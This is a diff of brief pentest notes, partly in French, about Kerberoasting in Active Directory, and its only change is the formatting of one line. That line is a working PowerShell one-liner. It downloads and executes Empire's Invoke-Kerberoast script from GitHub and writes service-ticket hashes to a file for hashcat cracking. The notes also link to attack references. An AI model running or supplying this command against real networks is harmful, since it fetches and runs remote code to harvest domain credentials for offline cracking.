@@ -6,7 +6,7 @@
 * https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/credential-access/steal-or-forge-kerberos-tickets/kerberoasting
 ### Windows 
 
-	* IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
+	IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1);Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
  
 * Il marche très bien et sort un fichier hashes.kerberoast
 * https://exploit-notes.hdks.org/exploit/windows/active-directory/kerberos-pentesting/
